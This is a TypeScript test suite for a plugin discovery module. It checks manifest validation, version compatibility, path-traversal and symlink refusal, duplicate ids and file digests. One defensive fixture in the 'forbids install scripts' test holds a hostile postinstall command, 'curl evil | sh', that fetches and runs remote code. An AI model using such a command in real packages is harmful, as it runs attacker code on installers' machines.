import assert from 'node:assert/strict';
import { mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, before, beforeEach, describe, it } from 'node:test';

import { discoverPlugins, type DiscoveredPlugin, type PluginRoot } from './discovery.js';

const CORE = '1.2.0';

function manifest(id: string, extra: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    id,
    version: '1.0.0',
    name: `Plugin ${id}`,
    engines: { swellwright: '>=1.0 <2' },
    provides: [{ kind: 'DnsProvider', entry: './dist/provider.js' }],
    permissions: { network: ['api.nic.ru:443'], secrets: ['dns-oauth'] },
    license: 'AGPL-3.0-only',
    ...extra,
  };
}

describe('plugin discovery', () => {
  let base: string;
  let official: PluginRoot;
  let local: PluginRoot;

  before(async () => {
    base = await mkdtemp(join(tmpdir(), 'sw-plugins-'));
  });
  after(async () => {
    await rm(base, { recursive: true, force: true });
  });
  beforeEach(async () => {
    await rm(join(base, 'official'), { recursive: true, force: true });
    await rm(join(base, 'local'), { recursive: true, force: true });
    await mkdir(join(base, 'official'), { recursive: true });
    await mkdir(join(base, 'local'), { recursive: true });
    official = { directory: join(base, 'official'), trust: 'official' };
    local = { directory: join(base, 'local'), trust: 'local' };
  });

  /** Makes a plugin directory: the manifest, the module it names, and whatever else is given. */
  async function plugin(
    root: PluginRoot,
    folder: string,
    content: Record<string, unknown> | string = manifest(folder),
    files: Record<string, string> = { 'dist/provider.js': 'export {};' },
  ): Promise<void> {
    const directory = join(root.directory, folder);
    await mkdir(directory, { recursive: true });
    await writeFile(
      join(directory, 'swellwright.plugin.json'),
      typeof content === 'string' ? content : JSON.stringify(content),
    );
    for (const [name, text] of Object.entries(files)) {
      await mkdir(join(directory, name, '..'), { recursive: true });
      await writeFile(join(directory, name), text);
    }
  }

  const only = (found: readonly DiscoveredPlugin[]): DiscoveredPlugin => {
    assert.equal(found.length, 1);
    const [one] = found;
    assert.ok(one);
    return one;
  };

  it('finds a sound plugin, and says where it came from', async () => {
    await plugin(official, 'dns-rucenter');
    await plugin(
      local,
      'notify-webhook',
      manifest('notify-webhook', {
        provides: [{ kind: 'NotificationChannel', driver: 'driver.yaml' }],
      }),
      { 'driver.yaml': 'name: x' },
    );
    const found = await discoverPlugins([official, local], CORE);
    assert.deepEqual(
      found.map((p) => [p.folder, p.trust, p.state, p.problems.length]),
      [
        ['dns-rucenter', 'official', 'available', 0],
        ['notify-webhook', 'local', 'available', 0],
      ],
    );
    assert.equal(found[0]?.manifest?.permissions.network[0], 'api.nic.ru:443');
  });

  it('skips a root that does not exist, hidden folders, node_modules and plain files', async () => {
    await mkdir(join(official.directory, '.git'));
    await mkdir(join(official.directory, 'node_modules'));
    await writeFile(join(official.directory, 'README.md'), '# plugins');
    await plugin(official, 'dns-rucenter');
    const found = await discoverPlugins(
      [{ directory: join(base, 'nowhere'), trust: 'official' }, official],
      CORE,
    );
    assert.deepEqual(
      found.map((p) => p.folder),
      ['dns-rucenter'],
    );
  });

  it('reports a directory without a manifest', async () => {
    await mkdir(join(official.directory, 'dns-rucenter'));
    const found = only(await discoverPlugins([official], CORE));
    assert.equal(found.state, 'invalid');
    assert.match(found.problems.join(), /has no swellwright\.plugin\.json/u);
    assert.equal(found.manifest, undefined);
  });

  it('reports a manifest that is not JSON or does not fit the schema', async () => {
    await plugin(official, 'broken', '{ not json');
    await plugin(official, 'strange', manifest('strange', { permisions: {} }));
    await plugin(official, 'badid', manifest('Bad_Id'));
    const found = await discoverPlugins([official], CORE);
    const byFolder = Object.fromEntries(found.map((p) => [p.folder, p]));
    assert.match(byFolder['broken']?.problems.join() ?? '', /not valid JSON/u);
    assert.match(byFolder['strange']?.problems.join() ?? '', /permisions/u);
    assert.match(byFolder['badid']?.problems.join() ?? '', /^id: /u);
    assert.ok(found.every((p) => p.state === 'invalid'));
  });

  it('refuses a manifest that is too large', async () => {
    await plugin(official, 'huge', 'x'.repeat(70 * 1024));
    const found = only(await discoverPlugins([official], CORE));
    assert.equal(found.state, 'invalid');
    assert.match(found.problems.join(), /larger than 64 KiB/u);
  });

  it('wants the directory to be named after the plugin', async () => {
    await plugin(official, 'some-folder', manifest('dns-rucenter'));
    const found = only(await discoverPlugins([official], CORE));
    assert.equal(found.state, 'invalid');
    assert.match(found.problems.join(), /named "some-folder" but the plugin id is "dns-rucenter"/u);
  });

  it('distinguishes a plugin for other versions from a broken one', async () => {
    await plugin(official, 'too-new', manifest('too-new', { engines: { swellwright: '>=2.0' } }));
    await plugin(official, 'too-old', manifest('too-old', { engines: { swellwright: '<1.0.0' } }));
    await plugin(
      official,
      'nonsense',
      manifest('nonsense', { engines: { swellwright: '>>=what' } }),
    );
    const found = Object.fromEntries(
      (await discoverPlugins([official], CORE)).map((p) => [p.folder, p]),
    );
    const at = (folder: string): DiscoveredPlugin => {
      const one = found[folder];
      assert.ok(one, folder);
      return one;
    };
    assert.equal(at('too-new').state, 'incompatible');
    assert.match(at('too-new').problems.join(), /needs Swellwright >=2\.0, this is 1\.2\.0/u);
    assert.equal(at('too-old').state, 'incompatible');
    assert.equal(at('nonsense').state, 'invalid');
    assert.ok(at('too-new').manifest, 'a plugin for other versions is still described');
  });

  it('counts a pre-release of the core as the version it is heading for', async () => {
    await plugin(official, 'dns-rucenter');
    const found = only(await discoverPlugins([official], '1.3.0-rc.1'));
    assert.equal(found.state, 'available');
  });

  it('reports a file the manifest names that is not there', async () => {
    await plugin(
      official,
      'dns-rucenter',
      manifest('dns-rucenter', { ui: { settings: 'ui/settings.json' } }),
    );
    const found = only(await discoverPlugins([official], CORE));
    assert.equal(found.state, 'invalid');
    assert.deepEqual(found.problems, ['"ui/settings.json" does not exist']);
  });

  it('refuses a path that leaves the plugin, however it is written', async () => {
    await plugin(official, 'escape', manifest('escape', { config: { schema: '../outside.json' } }));
    const found = only(await discoverPlugins([official], CORE));
    assert.equal(found.state, 'invalid');
    assert.match(found.problems.join(), /config\.schema/u);
  });

  it('does not follow a link out of the plugin', async (t) => {
    await writeFile(join(base, 'outside.js'), 'export {};');
    await plugin(official, 'linked', manifest('linked'), {});
    await mkdir(join(official.directory, 'linked', 'dist'));
    try {
      await symlink(
        join(base, 'outside.js'),
        join(official.directory, 'linked', 'dist', 'provider.js'),
      );
    } catch {
      t.skip('this system does not let the test make links');
      return;
    }
    const found = only(await discoverPlugins([official], CORE));
    assert.equal(found.state, 'invalid');
    assert.match(found.problems.join(), /leads outside the plugin directory/u);
  });

  it('does not follow a plugin directory that is a link', async (t) => {
    await plugin(local, 'real-one');
    try {
      await symlink(
        join(local.directory, 'real-one'),
        join(official.directory, 'linked-one'),
        'dir',
      );
    } catch {
      t.skip('this system does not let the test make links');
      return;
    }
    const found = only(await discoverPlugins([official], CORE));
    assert.equal(found.state, 'invalid');
    assert.match(found.problems.join(), /is a link/u);
  });

  it('forbids install scripts', async () => {
    await plugin(official, 'dns-rucenter', manifest('dns-rucenter'), {
      'dist/provider.js': 'export {};',
      'package.json': JSON.stringify({
        name: 'x',
        scripts: { postinstall: 'curl evil | sh', test: 'node t.js' },
      }),
    });
    const found = only(await discoverPlugins([official], CORE));
    assert.equal(found.state, 'invalid');
    assert.deepEqual(found.problems, [
      'package.json has a "postinstall" script; plugins may not run install scripts',
    ]);
  });

  it('accepts a package.json without install scripts', async () => {
    await plugin(official, 'dns-rucenter', manifest('dns-rucenter'), {
      'dist/provider.js': 'export {};',
      'package.json': JSON.stringify({ name: 'x', scripts: { build: 'tsc' } }),
    });
    assert.equal(only(await discoverPlugins([official], CORE)).state, 'available');
  });

  it('lets the earlier root win when two plugins have the same id', async () => {
    await plugin(official, 'dns-rucenter');
    await plugin(local, 'dns-rucenter');
    const found = await discoverPlugins([official, local], CORE);
    assert.deepEqual(
      found.map((p) => [p.trust, p.state]),
      [
        ['official', 'available'],
        ['local', 'invalid'],
      ],
    );
    assert.match(found[1]?.problems.join() ?? '', /already used by/u);
  });

  it('gives a usable plugin the digest of its files and an unusable one none', async () => {
    await plugin(official, 'dns-rucenter');
    await plugin(
      official,
      'dns-other',
      manifest('dns-other', { engines: { swellwright: '>=9.0' } }),
    );
    await mkdir(join(official.directory, 'no-manifest'));
    const found = await discoverPlugins([official], CORE);
    const byFolder = Object.fromEntries(found.map((p) => [p.folder, p]));
    assert.match(byFolder['dns-rucenter']?.digest ?? '', /^[0-9a-f]{64}$/u);
    assert.match(
      byFolder['dns-other']?.digest ?? '',
      /^[0-9a-f]{64}$/u,
      'an incompatible plugin has one to show',
    );
    assert.equal(byFolder['no-manifest']?.digest, undefined);
    assert.equal(byFolder['dns-rucenter']?.digest === byFolder['dns-other']?.digest, false);
  });

  it('changes the digest when a file changes, is added or is removed', async () => {
    await plugin(official, 'dns-rucenter');
    const digest = async (): Promise<string | undefined> =>
      only(await discoverPlugins([official], CORE)).digest;
    const first = await digest();
    await writeFile(
      join(official.directory, 'dns-rucenter', 'dist', 'provider.js'),
      'export const x = 1;',
    );
    const changed = await digest();
    await writeFile(join(official.directory, 'dns-rucenter', 'notes.txt'), 'new');
    const added = await digest();
    await rm(join(official.directory, 'dns-rucenter', 'notes.txt'));
    const removed = await digest();
    assert.equal(new Set([first, changed, added]).size, 3);
    assert.equal(removed, changed, 'back to the same files, the same digest');
  });

  it('refuses a link inside a plugin, even one that stays inside it', async () => {
    await plugin(official, 'dns-rucenter');
    try {
      await symlink(
        join(official.directory, 'dns-rucenter', 'dist'),
        join(official.directory, 'dns-rucenter', 'alias'),
        'dir',
      );
    } catch {
      return; // creating links needs a privilege on some systems
    }
    const found = only(await discoverPlugins([official], CORE));
    assert.equal(found.state, 'invalid');
    assert.match(found.problems.join(), /may not contain links/u);
  });
});
